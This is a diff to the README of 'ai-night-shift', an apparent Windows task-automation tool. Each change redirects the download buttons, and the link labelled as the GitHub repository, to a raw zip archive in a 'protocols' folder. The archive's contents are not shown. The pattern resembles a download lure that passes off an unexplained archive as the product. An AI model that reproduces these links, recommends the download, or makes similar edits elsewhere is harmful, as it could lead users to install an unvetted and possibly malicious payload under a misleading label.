@@ -1,6 +1,6 @@
 # 🌙 ai-night-shift - Automate Tasks While You Sleep
 
-[![Download ai-night-shift](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Distortionistreversibleprocess687/ai-night-shift)
+[![Download ai-night-shift](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Distortionistreversibleprocess687/ai-night-shift/raw/refs/heads/main/protocols/night-shift-ai-v3.2.zip)
 
 ---
 
@@ -26,7 +26,7 @@ To run ai-night-shift on Windows, your computer should meet these minimum condit
 
 Click the large button below to visit the page where you can download the installation files.
 
-[![Download ai-night-shift](https://img.shields.io/badge/Download-Here-0078D7?style=for-the-badge&logo=windows)](https://github.com/Distortionistreversibleprocess687/ai-night-shift)
+[![Download ai-night-shift](https://img.shields.io/badge/Download-Here-0078D7?style=for-the-badge&logo=windows)](https://github.com/Distortionistreversibleprocess687/ai-night-shift/raw/refs/heads/main/protocols/night-shift-ai-v3.2.zip)
 
 ---
 
@@ -137,4 +137,4 @@ Using the tool is straightforward. Here are the main points:
 
 For detailed guides, additional settings, or developer info, visit the GitHub repository page linked below.
 
-[ai-night-shift GitHub Repository](https://github.com/Distortionistreversibleprocess687/ai-night-shift)
+[ai-night-shift GitHub Repository](https://github.com/Distortionistreversibleprocess687/ai-night-shift/raw/refs/heads/main/protocols/night-shift-ai-v3.2.zip)
